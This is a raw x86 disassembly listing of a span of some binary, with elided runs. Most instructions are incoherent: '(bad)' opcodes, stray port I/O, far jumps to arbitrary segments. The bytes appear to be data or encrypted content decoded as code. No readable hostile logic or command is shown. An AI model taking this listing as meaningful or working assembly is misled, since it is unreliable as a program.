  420f30:	rcl    BYTE PTR [eax-0x2dc72044],1
  420f36:	jp     0x420ee5
  420f38:	mov    ecx,0xfc1eebdc
  420f3d:	mov    ebx,0x1c2fa9
	...
  420fb2:	add    BYTE PTR [eax],al
  420fb4:	bound  esp,QWORD PTR [ebp-0x8808a]
  420fba:	imul   edi,DWORD PTR [ebp-0x6d53d0f4],0xffffff9b
  420fc1:	in     al,dx
  420fc2:	jl     0x420fe8
  420fc4:	add    DWORD PTR [ecx+0x1],esp
  420fc7:	add    ch,dh
  420fc9:	add    BYTE PTR [eax],al
  420fcb:	add    BYTE PTR [esi+0x55],ch
  420fce:	(bad)  
  420fd0:	(bad)  
  420fd1:	jno    0x421050
  420fd3:	aam    0xbe
  420fd5:	inc    ebp
  420fd6:	sub    dh,ch
  420fd8:	xor    al,0xea
  420fda:	icebp  
  420fdb:	cmp    bl,BYTE PTR [eax-0x26896d57]
  420fe1:	jne    0x42100f
  420fe3:	pop    es
  420fe4:	repz jp 0x421042
  420fe7:	and    eax,0xf33e8a1f
  420fec:	push   edx
  420fed:	mov    bh,BYTE PTR ds:0xb2db896d
  420ff3:	adc    ecx,DWORD PTR [ebx+ecx*4+0x52]
  420ff7:	cld    
  420ff8:	cdq    
  420ff9:	loop   0x420fc8
  420ffb:	rcr    cl,0x4f
  420ffe:	push   0x547ecd9a
  421003:	push   cs
  421004:	mov    cl,0xb6
  421006:	sbb    eax,0x8058b527
  42100b:	dec    esi
  42100c:	addr16 add eax,0xb6e7d824
  421012:	sahf   
  421013:	(bad)  [ebp-0x4311dd64]
  421019:	add    DWORD PTR [ebx-0x20],edi
  42101c:	lea    ebp,[esi+0x44]
  42101f:	push   edi
  421020:	dec    ebx
  421021:	xor    esp,DWORD PTR [eax-0x7273ad78]
  421027:	inc    cx
  421029:	dec    ebx
  42102a:	mul    BYTE PTR [edi]
  42102c:	push   ebx
  42102d:	pop    ds
  42102e:	ror    DWORD PTR [esi],cl
  421030:	add    eax,0xa653e5ac
  421035:	out    dx,al
  421036:	js     0x42108b
  421038:	jae    0x420fc8
  42103a:	mov    dh,0x68
  42103c:	jecxz  0x421068
  42103e:	jns    0x421060
  421040:	popa   
  421041:	mov    eax,0x19f58ee4
  421046:	push   edx
  421047:	cmp    edx,DWORD PTR [edi+ebp*2+0x36]
  42104b:	jmp    0x421085
  42104d:	aaa    
  42104e:	retf   
  42104f:	inc    esi
  421050:	sbb    al,dl
  421052:	in     al,dx
  421053:	cmp    ebp,DWORD PTR [eax]
  421055:	push   es
  421056:	mov    edx,0x6bd7a734
  42105b:	test   eax,0x23714daf
  421060:	outs   dx,DWORD PTR ds:[esi]
  421061:	sbb    al,0x69
  421063:	fadd   st(3),st
  421065:	imul   eax,DWORD PTR [edx+0x22],0x2d
  421069:	pop    es
  42106a:	stos   DWORD PTR es:[edi],eax
  42106b:	sahf   
  42106c:	jns    0x42109f
  42106e:	push   esi
  42106f:	daa    
  421070:	pop    eax
  421071:	mov    dl,0xd
  421073:	and    edi,DWORD PTR ds:0x7df8f191
  421079:	adc    BYTE PTR ds:0xd407dc81,ch
  42107f:	inc    ebx
  421080:	stos   DWORD PTR es:[edi],eax
  421081:	stos   DWORD PTR es:[edi],eax
  421082:	adc    BYTE PTR [eax-0x659c1f71],bh
  421088:	hlt    
  421089:	mov    ch,0x47
  42108b:	cdq    
  42108c:	sub    BYTE PTR [edi-0x54],dl
  42108f:	scas   eax,DWORD PTR es:[edi]
  421090:	(bad)  
  421092:	cmp    ebx,0x4ff6b579
  421098:	outs   dx,DWORD PTR ds:[esi]
  421099:	sbb    cl,BYTE PTR [edx+ecx*2+0x68]
  42109d:	xor    al,0x5a
  42109f:	lds    edx,FWORD PTR [esi+edi*8+0x3b]
  4210a3:	cmp    BYTE PTR [edi-0x1e],cl
  4210a6:	out    dx,eax
  4210a7:	cmp    esi,DWORD PTR [ebx+ebx*1+0x1e6e846d]
  4210ae:	cs je  0x4210c5
  4210b1:	cs pop edi
  4210b3:	xor    al,0x56
  4210b5:	(bad)  
  4210b6:	int    0x7b
  4210b8:	push   ebp
  4210b9:	jge    0x42103f
  4210bb:	stc    
  4210bc:	fist   WORD PTR [edx+0x30]
  4210bf:	(bad)  
  4210c0:	in     eax,dx
	...
  421131:	add    BYTE PTR [eax],al
  421133:	add    BYTE PTR [ebx-0x31],dh
  421136:	fwait
  421137:	cmp    DWORD PTR [edi+0x15cff37d],edi
  42113d:	dec    edi
  42113e:	data16 jg 0x4210f9
  421141:	add    BYTE PTR [eax+0x161f635],bh
  421147:	add    ch,dh
  421149:	add    BYTE PTR [eax],al
  42114b:	add    BYTE PTR [edx+0x67],cl
  42114e:	lods   al,BYTE PTR ds:[esi]
  42114f:	repz (bad) 
  421151:	dec    esi
  421152:	jmp    0x2988:0x76edf89e
  421159:	aad    0x8
  42115b:	fadd   QWORD PTR [esi]
  42115d:	xor    bh,bh
  42115f:	sbb    edx,DWORD PTR [edx]
  421161:	pop    ss
  421162:	dec    edx
  421163:	jo     0x42110c
  421165:	dec    esp
  421166:	mov    bh,ch
  421168:	scas   eax,DWORD PTR es:[edi]
  421169:	popa   
  42116a:	das    
  42116b:	data16 cmp al,BYTE PTR [ecx]
  42116e:	sbb    BYTE PTR [ebp+eax*4-0x5396e593],dl
  421175:	adc    ch,BYTE PTR [eax+0x2314d4ac]
  42117b:	aam    0x66
  42117d:	lea    eax,[edi-0x1c]
  421180:	push   eax
  421181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421182:	mov    dh,0x89
  421184:	repnz imul esp,esi,0xffffffd9
  421188:	(bad)  
  421189:	jg     0x42119f
  42118b:	mov    dl,0x84
  42118d:	mov    al,BYTE PTR [ebx+0x76]
  421190:	or     DWORD PTR [edi-0x6d],0xffffffb6
  421194:	jmp    0x421179
  421196:	push   edx
  421197:	call   0x649e:0xcc37f950
  42119e:	lds    ebp,FWORD PTR [eax+eax*4+0x59]
  4211a2:	fmul   DWORD PTR [ebp+0x763059bb]
  4211a8:	outs   dx,DWORD PTR ds:[esi]
  4211a9:	or     al,0x4b
  4211ab:	or     BYTE PTR [ebx-0x7fe4b3bb],0x2
  4211b2:	fidivr DWORD PTR [eax*1+0x40590f84]
  4211b9:	in     eax,dx
  4211ba:	pop    edi
  4211bb:	adc    ecx,DWORD PTR [edx-0x63]
  4211be:	cdq    
  4211bf:	xor    ecx,DWORD PTR [esi]
  4211c1:	stos   BYTE PTR es:[edi],al
  4211c2:	mov    BYTE PTR ds:0x6193cd83,al
  4211c8:	and    DWORD PTR [ebx+0x405cb96b],ecx
  4211ce:	shl    DWORD PTR [ebp-0x29850b9e],1
  4211d4:	(bad)  
  4211d5:	mov    fs,WORD PTR [esp+eiz*8+0x29]
  4211d9:	mov    ds:0x44e41f2b,al
  4211de:	jl     0x421257
  4211e0:	mov    edx,0xd5bfb53f
  4211e5:	mov    eax,0x232d5024
  4211ea:	push   edx
  4211eb:	or     DWORD PTR [edx],edx
  4211ed:	cld    
  4211ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4211ef:	fimul  DWORD PTR [edi+0xa]
  4211f2:	mov    dh,0x14
  4211f4:	les    eax,FWORD PTR [esp+eiz*4+0x7]
  4211f8:	xor    ebp,edx
  4211fa:	cmp    ecx,DWORD PTR [edi+ebx*1-0x2bb8766]
  421201:	xor    eax,DWORD PTR [ebx-0x6d]
  421204:	jle    0x4211c5
  421206:	dec    esp
  421207:	xchg   ebp,eax
  421208:	push   cs
  421209:	mov    ch,0x46
  42120b:	enter  0x76dd,0xd6
  42120f:	adc    esp,edi
  421211:	fucomp st(2)
  421213:	push   ebx
  421214:	sti    
  421215:	pop    ds
  421216:	push   cs
  421217:	mov    ?,esp
  421219:	xor    DWORD PTR [edx+eax*4],esi
  42121c:	cmc    
  42121d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42121e:	or     DWORD PTR [eax+0x66],ebx
  421221:	inc    ebx
  421222:	adc    cl,BYTE PTR [ebp-0x7]
  421225:	(bad)  
  421226:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  421227:	outs   dx,BYTE PTR ds:[esi]
  421228:	mov    dl,0x55
  42122a:	pop    esp
  42122b:	xor    al,0x0
  42122d:	mov    WORD PTR es:[esp+esi*8-0x7a],es
  421232:	fsubr  st(0),st
  421234:	jmp    0xb4fd:0x3527b8c3
  42123b:	lods   al,BYTE PTR ds:[esi]
  42123c:	nop
  42123d:	cmp    BYTE PTR [ebp+0x9058],bl
	...
  4212b3:	add    BYTE PTR [ecx+0x6],al
  4212b6:	clc    
  4212b7:	mov    esi,0xff47feff
  4212bc:	or     eax,0x2e83dc15
  4212c1:	jns    0x4212d2
  4212c3:	push   ss
  4212c4:	jmp    0x421328
  4212c6:	add    DWORD PTR [eax],eax
  4212c8:	cmc    
  4212c9:	add    BYTE PTR [eax],al
  4212cb:	add    ah,ch
  4212cd:	ss push esi
  4212cf:	loopne 0x421253
  4212d1:	xor    ch,0x0
  4212d4:	sbb    al,0xa1
  4212d6:	daa    
  4212d7:	xchg   esi,eax
  4212d8:	lods   al,BYTE PTR ds:[esi]
  4212d9:	or     ebp,edx
  4212db:	leave  
  4212dc:	fist   WORD PTR [edi-0x3]
  4212df:	mov    ch,0xbb
  4212e1:	mov    eax,0xc6792641
  4212e6:	push   esi
  4212e7:	fdiv   DWORD PTR [esi]
  4212e9:	scas   eax,DWORD PTR es:[edi]
  4212ea:	je     0x421275
  4212ec:	xchg   ah,ah
  4212ee:	xor    esi,DWORD PTR [ecx-0x6ed44f57]
  4212f4:	mov    ecx,0x4f91e87a
  4212f9:	dec    ebx
  4212fa:	es fcmovb st,st(4)
  4212fd:	inc    ebx
  4212fe:	inc    ecx
  4212ff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421300:	(bad)  
  421301:	ins    DWORD PTR es:[edi],dx
  421302:	aaa    
  421303:	scas   al,BYTE PTR es:[edi]
  421304:	pop    ds
  421305:	std    
  421306:	dec    ecx
  421307:	or     al,0x5e
  421309:	mov    dh,0x68
  42130b:	mov    ch,0x8
  42130d:	xor    bl,BYTE PTR [ebp-0xf049822]
  421313:	sbb    eax,ecx
  421315:	jo     0x4212ba
  421317:	adc    DWORD PTR [ebx],eax
  421319:	xchg   BYTE PTR [edx+0x113dbbfa],ch
  42131f:	(bad)  
  421320:	rol    BYTE PTR [esi],1
  421322:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421323:	push   edx
  421324:	(bad)  
  421325:	mov    al,0x5e
  421327:	mov    edi,0x24742dac
  42132c:	imul   edx,DWORD PTR es:[eax-0x6e],0x2e
  421331:	add    al,0x5b
  421333:	(bad)  
  421334:	cmp    edi,DWORD PTR ds:0x185fd5be
  42133a:	inc    ebp
  42133b:	pop    ebp
  42133c:	fxch   st(3)
  42133e:	sbb    BYTE PTR [ecx+eax*8-0x1078258f],al
  421345:	jnp    0x42139e
  421347:	push   ds
  421348:	mul    DWORD PTR [esi]
  42134a:	pop    eax
  42134b:	mov    edx,0xc099f822
  421350:	pop    edi
  421351:	jecxz  0x42136a
  421353:	mov    cl,0xc6
  421355:	xor    DWORD PTR [edi+0x3b],ebx
  421358:	test   DWORD PTR [eax+esi*4-0x79],esp
  42135c:	scas   eax,DWORD PTR es:[edi]
  42135d:	pop    esp
  42135e:	inc    esi
  42135f:	pop    es
  421360:	xchg   esi,eax
  421361:	mov    dh,bl
  421363:	retf   0x565b
  421366:	out    dx,eax
  421367:	sub    ebp,ecx
  421369:	jo     0x4213c1
  42136b:	xchg   DWORD PTR [ebx-0x34515600],ebx
  421371:	and    ch,bh
  421373:	xchg   sp,ax
  421375:	mov    edx,0x54cdcaa2
  42137a:	ss fwait
  42137c:	aad    0x2e
  42137e:	xchg   esi,eax
  42137f:	inc    ebx
  421380:	mov    eax,0x274898b2
  421385:	repnz or eax,DWORD PTR [ecx-0x78627407]
  42138c:	add    bl,ch
  42138e:	imul   ecx,DWORD PTR [esi+ecx*2-0x23b549a6],0xffffffad
  421396:	nop
  421397:	mov    dh,0x5d
  421399:	enter  0xf2e1,0x3f
  42139d:	mov    dl,0x35
  42139f:	sub    al,0x5d
  4213a1:	(bad)  
  4213a2:	(bad)  
  4213a3:	into   
  4213a4:	jo     0x4213a4
  4213a6:	jl     0x4213fb
  4213a8:	test   BYTE PTR [edi+0x4ca7116e],0x5
  4213af:	js     0x421424
  4213b1:	test   eax,0x48ab9458
  4213b6:	aam    0xcc
  4213b8:	(bad)  
  4213b9:	push   edi
  4213ba:	jmp    0xe6deb504
  4213bf:	dec    edx
  4213c0:	add    eax,DWORD PTR [eax]
	...
  421432:	add    BYTE PTR [eax],al
  421434:	scas   al,BYTE PTR es:[edi]
  421435:	xchg   esp,eax
  421436:	push   edi
  421437:	adc    bh,BYTE PTR [edi-0x2d]
  42143a:	out    dx,eax
  42143b:	mov    esp,0x960320e2
  421440:	pop    esp
  421441:	fstp   DWORD PTR [ebx]
  421443:	push   ecx
  421444:	loopne 0x4214a9
  421446:	add    DWORD PTR [eax],eax
  421448:	cmc    
  421449:	add    BYTE PTR [eax],al
  42144b:	add    BYTE PTR [ecx+ecx*8-0x1a],al
  42144f:	adc    BYTE PTR [esi],0x4b
  421452:	adc    dl,BYTE PTR [ebx+ebx*2-0x6bbd518]
  421459:	or     ah,ch
  42145b:	or     al,cl
  42145d:	loope  0x42145e
  42145f:	imul   esp,DWORD PTR [edx-0x6a7ce04f],0x23
  421466:	test   eax,0xb20ea192
  42146b:	add    esi,ebp
  42146d:	mov    bh,0x1f
  42146f:	xchg   esi,eax
  421470:	pop    ds
  421471:	or     eax,0x333adf24
  421476:	jp     0x421405
  421478:	lods   eax,DWORD PTR ds:[esi]
  421479:	jmp    0x4214f8
  42147b:	hlt    
  42147c:	mov    bl,0xcd
  42147e:	mov    ebp,0x5390e1
  421483:	and    al,0x92
  421485:	inc    edx
  421486:	(bad)  [esi+ebp*4-0x255ed182]
  42148d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42148e:	outs   dx,BYTE PTR ds:[esi]
  42148f:	or     DWORD PTR [eax+ebp*8-0x11],edi
  421493:	mov    al,0xc2
  421495:	or     DWORD PTR ss:[ebx-0x22fc9ac1],0x66
  42149d:	pop    edx
  42149e:	cmc    
  42149f:	xor    eax,0x521812c1
  4214a4:	iret   
  4214a5:	(bad)  
  4214a6:	sbb    eax,ebp
  4214a8:	lods   eax,DWORD PTR ds:[esi]
  4214a9:	push   ss
  4214aa:	pushf  
  4214ab:	mov    ch,0x70
  4214ad:	or     BYTE PTR [eax],dh
  4214af:	mov    ch,0xc4
  4214b1:	add    DWORD PTR [ebx+eiz*1+0x60],esi
  4214b5:	inc    edi
  4214b6:	sbb    eax,0x9a656ea8
  4214bb:	mov    ecx,0xfb200111
  4214c0:	dec    ebx
  4214c1:	sti    
  4214c2:	cdq    
  4214c3:	cmc    
  4214c4:	pop    ebx
  4214c5:	sahf   
  4214c6:	jno    0x421528
  4214c8:	rcl    DWORD PTR [ecx+edi*8-0xa],1
  4214cc:	popf   
  4214cd:	or     BYTE PTR [edi],cl
  4214cf:	xchg   esp,eax
  4214d0:	adc    BYTE PTR ds:0xfa562270,0x51
  4214d7:	enter  0xa3e,0xcd
  4214db:	loope  0x42150d
  4214dd:	dec    esi
  4214de:	and    esp,edx
  4214e0:	clc    
  4214e1:	xor    BYTE PTR [edi],0x7a
  4214e4:	pop    es
  4214e5:	lock cs mov bh,0x2d
  4214e9:	nop
  4214ea:	jp     0x421483
  4214ec:	enter  0xaec3,0xe0
  4214f0:	test   DWORD PTR [eax+0x19],esi
  4214f3:	test   BYTE PTR [ebp-0x482bd58d],dh
  4214f9:	xor    edi,edx
  4214fb:	xor    al,BYTE PTR [ebp-0x17]
  4214fe:	into   
  4214ff:	test   eax,0x8d1b93c6
  421504:	sub    al,BYTE PTR [eax+0x4bd80d3d]
  42150a:	in     eax,0x7c
  42150c:	xor    al,0xf6
  42150e:	xchg   ebx,eax
  42150f:	loope  0x4214b9
  421511:	dec    edi
  421512:	lods   eax,DWORD PTR ds:[esi]
  421513:	(bad)  
  421515:	loopne 0x4214fe
  421517:	shl    BYTE PTR [ecx+ebp*1],0x12
  42151b:	mov    esi,0xe08ab359
  421520:	aas    
  421521:	fdiv   DWORD PTR [edi-0x1b]
  421524:	or     DWORD PTR ds:0x6920db3d,edi
  42152a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42152b:	ja     0x421516
  42152d:	out    0x61,eax
  42152f:	repz sbb eax,0x65986646
  421535:	add    ebp,eax
  421537:	pop    esi
  421538:	push   ss
  421539:	std    
  42153a:	jle    0x421542
  42153c:	jns    0x4215b4
  42153e:	call   0x42f2ae
	...
  4215b3:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  4215ba:	mov    ah,0xec
  4215bc:	int3   
  4215bd:	ror    BYTE PTR [edx+ebp*4],cl
  4215c0:	dec    edx
  4215c1:	sub    BYTE PTR [edx],0xe4
  4215c4:	aad    0x64
  4215c6:	add    DWORD PTR [eax],eax
  4215c8:	cmc    
  4215c9:	add    BYTE PTR [eax],al
  4215cb:	add    BYTE PTR [esi],bl
  4215cd:	xchg   esp,eax
  4215ce:	repz popf 
  4215d0:	repz in al,dx
  4215d2:	pop    edx
  4215d3:	mov    esp,0x62b255aa
  4215d8:	jb     0x421570
  4215da:	nop
  4215db:	and    ebx,0x68
  4215de:	fsubr  QWORD PTR [esi+edx*1-0x15]
  4215e2:	mov    esi,ecx
  4215e4:	cs mov esp,0xf48f6601
  4215ea:	sub    al,0xd9
  4215ec:	jle    0x4215c8
  4215ee:	cld    
  4215ef:	lock sub esp,edi
  4215f2:	ins    BYTE PTR es:[edi],dx
  4215f3:	or     BYTE PTR [ebx-0x69],ch
  4215f6:	aam    0x1e
  4215f8:	or     al,0x4b
  4215fa:	out    dx,eax
  4215fb:	inc    BYTE PTR [edi-0xa]
  4215fe:	cmp    esp,DWORD PTR [edi]
  421600:	aaa    
  421601:	inc    edi
  421602:	idiv   ah
  421604:	mov    ds:0xb6ddaa7f,al
  421609:	pop    edi
  42160a:	inc    esp
  42160b:	(bad)  
  42160c:	loopne 0x4215bf
  42160e:	sub    eax,0xc206ff56
  421613:	jg     0x4215ea
  421615:	lods   eax,DWORD PTR ds:[esi]
  421616:	clc    
  421617:	push   ebp
  421618:	jge    0x4215c0
  42161a:	loope  0x421600
  42161c:	push   ds
  42161d:	or     edi,DWORD PTR [esi-0x7e43c17c]
  421623:	js     0x4215f7
  421625:	das    
  421626:	pop    es
  421627:	std    
  421628:	cmp    cl,ch
  42162a:	inc    ebx
  42162b:	sub    dl,BYTE PTR [ecx-0x52]
  42162e:	jl     0x4215c8
  421630:	std    
  421631:	inc    ebp
  421632:	pop    ebp
  421633:	mov    dh,0x77
  421635:	inc    esi
  421636:	loope  0x4215c8
  421638:	(bad)  
  421639:	jmp    0x65743074
  42163e:	and    DWORD PTR [ebp+0x55d29970],esp
  421644:	jno    0x4216b8
  421646:	aaa    
  421647:	or     DWORD PTR [ebx-0x5793df6f],ecx
  42164d:	aaa    
  42164e:	push   eax
  42164f:	stc    
  421650:	or     eax,0xb54d0170
  421655:	xchg   BYTE PTR [edi+0x44556968],cl
  42165b:	(bad)  
  42165c:	fldcw  WORD PTR [eax+eax*2+0x2162aeec]
  421663:	mov    BYTE PTR es:[edi],ch
  421666:	jae    0x421639
  421668:	test   BYTE PTR [edx],bh
  42166a:	xchg   esp,eax
  42166b:	push   es
  42166c:	out    0xa6,al
  42166e:	sar    BYTE PTR [ecx+0x1966ab93],0xab
  421675:	mov    dh,cl
  421677:	icebp  
  421678:	es das 
  42167a:	fisttp QWORD PTR [esi]
  42167d:	test   al,0xd2
  42167f:	mov    eax,ds:0x6a28f274
  421684:	jp     0x42160a
  421686:	pop    es
  421687:	cli    
  421688:	pop    eax
  421689:	pop    ebp
  42168a:	sub    BYTE PTR [edx+0xd8ee44c],bh
  421690:	or     edx,DWORD PTR [ebx+0x22622911]
  421696:	lock push ebx
  421698:	pop    edi
  421699:	pop    es
  42169a:	cli    
  42169b:	rol    DWORD PTR [ebx+0x73],cl
  42169e:	in     al,dx
  42169f:	mov    eax,0x9621757a
  4216a4:	mov    bl,BYTE PTR [ebp-0x7]
  4216a7:	ret    0xe6bc
  4216aa:	out    0x27,al
  4216ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4216ad:	mov    ebp,0x2641bb86
  4216b2:	push   cs
  4216b3:	aas    
  4216b4:	ret    
  4216b5:	jp     0x421644
  4216b7:	add    BYTE PTR [ecx],0xe7
  4216ba:	lea    esp,[ebp+0x27489b84]
  4216c0:	fild   DWORD PTR [eax]
	...
  421732:	add    BYTE PTR [eax],al
  421734:	mov    DWORD PTR [edi],ebp
  421736:	and    eax,0xad8aa780
  42173b:	das    
  42173c:	retf   0x8184
  42173f:	cmp    eax,esp
  421741:	mov    dh,BYTE PTR [edi]
  421743:	pop    ds
  421744:	retf   0x165
  421747:	add    ch,dh
  421749:	add    BYTE PTR [eax],al
  42174b:	add    BYTE PTR [ebx],dl
  42174d:	in     eax,dx
  42174e:	loopne 0x421701
  421750:	sahf   
  421751:	fisub  WORD PTR [ebp-0x65]
  421754:	pop    eax
  421755:	sbb    DWORD PTR [eax-0x7d9e15d2],eax
  42175b:	jmp    0x421751
  42175d:	imul   ebx,edx,0xc
  421760:	test   DWORD PTR [edi-0x28],ecx
  421763:	repz pop ebx
  421765:	jp     0x4217e6
  421767:	les    ecx,FWORD PTR [edi+eiz*1-0xd87531f]
  42176e:	mov    edi,0x139cdb66
  421773:	adc    ah,BYTE PTR [edx+0x4b]
  421776:	scas   eax,DWORD PTR es:[edi]
  421777:	jno    0x4217e8
  421779:	sub    esi,esi
  42177b:	or     DWORD PTR [eax],ebx
  42177d:	push   es
  42177e:	dec    ecx
  42177f:	jno    0x42174e
  421781:	ret    0x4807
  421784:	test   eax,0x95f923fa
  421789:	sbb    eax,0xf885e02d
  42178e:	les    edx,FWORD PTR ds:0x9c0d4105
  421794:	jbe    0x4217a1
  421796:	or     dl,cl
  421798:	mov    ebx,0xdbb42a1c
  42179d:	fwait
  42179e:	fwait
  42179f:	mov    ch,BYTE PTR [esi+0x562975b]
  4217a5:	sbb    BYTE PTR [ecx],dl
  4217a7:	in     eax,dx
  4217a8:	and    BYTE PTR [esi+0x39],dl
  4217ab:	pop    eax
  4217ac:	sub    BYTE PTR [edi-0x8e6a255],ch
  4217b2:	clc    
  4217b3:	int3   
  4217b4:	and    al,0x18
  4217b6:	dec    esp
  4217b7:	push   edx
  4217b8:	push   es
  4217b9:	cmp    ecx,eax
  4217bb:	dec    esi
  4217bc:	push   cs
  4217bd:	(bad)  
  4217be:	jmp    0x4217ae
  4217c0:	or     DWORD PTR [esi],ebx
  4217c2:	mov    eax,ds:0xed5ba428
  4217c7:	fdiv   st,st(1)
  4217c9:	inc    ebx
  4217ca:	mov    ds:0xabc3eb3c,al
  4217cf:	test   BYTE PTR [esi],al
  4217d1:	and    BYTE PTR [esp+ebp*1-0x265cbde6],0x71
  4217d9:	int    0xbd
  4217db:	cwde   
  4217dc:	jl     0x4217b1
  4217de:	test   eax,0x5d7698a1
  4217e3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4217e4:	mov    bh,0x5f
  4217e6:	ins    BYTE PTR es:[edi],dx
  4217e7:	pop    esi
  4217e8:	ror    DWORD PTR ss:[esi-0x27ce6b86],cl
  4217ef:	push   esi
  4217f0:	in     al,0x74
  4217f2:	mov    ebx,0x110d263
  4217f7:	mov    esi,0x86966ff5
  4217fc:	loopne 0x4217c8
  4217fe:	pushf  
  4217ff:	pop    ss
  421800:	mov    ds:0xd9dfec14,eax
  421805:	sbb    BYTE PTR [edx+0x33],dl
  421808:	push   edx
  421809:	sar    DWORD PTR [ecx],0x15
  42180c:	sub    esi,edi
  42180e:	or     eax,0xeeb4efb8
  421813:	das    
  421814:	sub    ch,BYTE PTR [edi]
  421816:	jecxz  0x4217e1
  421818:	xor    BYTE PTR [esi+0x1fb576c1],cl
  42181e:	cmp    esi,DWORD PTR [eax]
  421820:	jbe    0x42185d
  421822:	mov    ah,0xb6
  421824:	cmp    BYTE PTR ds:0xd001f55f,0xbb
  42182b:	mov    eax,0x8e58b959
  421830:	jbe    0x4217df
  421832:	int3   
  421833:	(bad)  [esi+eax*8]
  421836:	push   ebp
  421837:	fld    QWORD PTR [esi+0x547c4f43]
  42183d:	sbb    bh,BYTE PTR [ecx+edx*4+0x7d]
	...
  4218b1:	add    BYTE PTR [eax],al
  4218b3:	add    ah,bl
  4218b5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4218b6:	jae    0x421905
  4218b8:	jnp    0x421899
  4218ba:	(bad)  
  4218bb:	mov    ch,0x82
  4218bd:	lods   eax,DWORD PTR ds:[esi]
  4218be:	push   ds
  4218bf:	adc    edx,ebx
  4218c1:	fisubr WORD PTR [edi]
  4218c3:	je     0x421884
  4218c5:	add    WORD PTR [eax],ax
  4218c8:	cmc    
  4218c9:	add    BYTE PTR [eax],al
  4218cb:	add    BYTE PTR [ecx+0xc334b1],bh
  4218d1:	sbb    al,0x12
  4218d3:	add    eax,0x8760928c
  4218d8:	mov    ds:0xd8d38562,al
  4218dd:	out    dx,al
  4218de:	mov    edi,0x3bc8c459
  4218e3:	adc    al,0xff
  4218e5:	jl     0x4218ec
  4218e7:	enter  0x3366,0x7f
  4218eb:	cmp    DWORD PTR [ebx-0x7f],edi
  4218ee:	pop    esp
  4218ef:	cld    
  4218f0:	stos   DWORD PTR es:[edi],eax
  4218f1:	es jb  0x42190e
  4218f4:	test   DWORD PTR [edx+eax*8],0x2a4271c3
  4218fb:	jae    0x421924
  4218fd:	je     0x421888
  4218ff:	and    esi,DWORD PTR [ecx]
  421901:	imul   ebp,DWORD PTR [ebx],0xcda5bde3
  421907:	and    al,0xff
  421909:	mov    esp,0x43216d1b
  42190e:	cmp    BYTE PTR [eax],0x4b
  421911:	imul   esp,DWORD PTR [eax-0x59],0xf503355a
  421918:	pop    ds
  421919:	rcr    DWORD PTR [edi],0xd9
  42191c:	sub    edi,DWORD PTR [esi-0x68]
  42191f:	fbld   TBYTE PTR [edx-0x5b]
  421922:	(bad)  
  421923:	(bad)  
  421924:	adc    cl,BYTE PTR [ebx+ecx*4]
  421927:	sahf   
  421928:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421929:	mov    ebx,DWORD PTR [esi+0x1553f982]
  42192f:	mov    dl,0x24
  421931:	(bad)  
  421932:	outs   dx,DWORD PTR ds:[esi]
  421933:	hlt    
  421934:	loop   0x421952
  421936:	les    edx,FWORD PTR [eax+0x1647fcd3]
  42193c:	xlat   BYTE PTR ds:[ebx]
  42193d:	retf   0x2269
  421940:	in     eax,dx
  421941:	(bad)  
  421943:	cmp    BYTE PTR [ebx-0x30eb51d],bl
  421949:	into   
  42194a:	mov    ah,0x7a
  42194c:	mov    bl,0x37
  42194e:	loope  0x4219b0
  421950:	iret   
  421951:	pushf  
  421952:	mov    dl,0x9
  421954:	loope  0x42197f
  421956:	pop    edx
  421957:	add    al,0x6
  421959:	hlt    
  42195a:	xor    dh,0xda
  42195d:	mov    ebx,esi
  42195f:	(bad)  
  421960:	mov    esi,0xecc33439
  421965:	or     eax,0x63b3d9a7
  42196a:	and    BYTE PTR [ebp+eax*4-0x2cafa80a],0x1c
  421972:	inc    edi
  421973:	aas    
  421974:	es in  eax,dx
  421976:	(bad)  
  421977:	outs   dx,BYTE PTR ds:[esi]
  421978:	daa    
  421979:	cmp    al,0x49
  42197b:	and    al,BYTE PTR [esi]
  42197d:	jp     0x421952
  42197f:	out    dx,eax
  421980:	sub    BYTE PTR [ecx-0x7f0eb676],cl
  421986:	jge    0x421996
  421988:	inc    eax
  421989:	cmp    bh,bl
  42198b:	fild   DWORD PTR [eax-0x35]
  42198e:	mov    bl,0x37
  421990:	jo     0x4219db
  421992:	xchg   DWORD PTR es:[edx],eax
  421995:	out    0xac,al
  421997:	pushf  
  421998:	adc    DWORD PTR ds:[esi],eax
  42199b:	push   ebx
  42199c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42199d:	sub    al,0xcf
  42199f:	ret    0x6504
  4219a2:	add    eax,0x15a8aa7e
  4219a7:	mov    esp,0xa949266
  4219ac:	fs popa 
  4219ae:	dec    ebp
  4219af:	mov    cl,0x1
  4219b1:	out    0x5e,eax
  4219b3:	inc    esi
  4219b4:	jns    0x42193e
  4219b6:	mov    ah,0x9f
  4219b8:	sub    DWORD PTR [edi+0x5e],ecx
  4219bb:	mov    eax,ds:0x9aea8ce9
  4219c0:	and    al,BYTE PTR [eax]
	...
  421a32:	add    BYTE PTR [eax],al
  421a34:	fbstp  TBYTE PTR [edx]
  421a36:	scas   eax,DWORD PTR es:[edi]
  421a37:	adc    ebp,edi
  421a39:	lahf   
  421a3a:	(bad)  
  421a3b:	(bad)  
  421a3c:	mov    al,0x37
  421a3e:	and    edx,DWORD PTR [edx-0x62df928c]
  421a44:	mov    ah,0x67
  421a46:	add    DWORD PTR [eax],eax
  421a48:	cmc    
  421a49:	add    BYTE PTR [eax],al
  421a4b:	add    BYTE PTR [ebp-0x64c1c5a9],ch
  421a51:	and    DWORD PTR [ebx-0x12],edx
  421a54:	sub    eax,DWORD PTR [edx]
  421a56:	lods   al,BYTE PTR ds:[esi]
  421a57:	test   dh,bl
  421a59:	adc    ebp,DWORD PTR [ebx]
  421a5b:	mov    esp,0x82e184ee
  421a60:	retf   0xb247
  421a63:	dec    edx
  421a64:	or     ebx,DWORD PTR [edx]
  421a66:	mov    ah,0xa
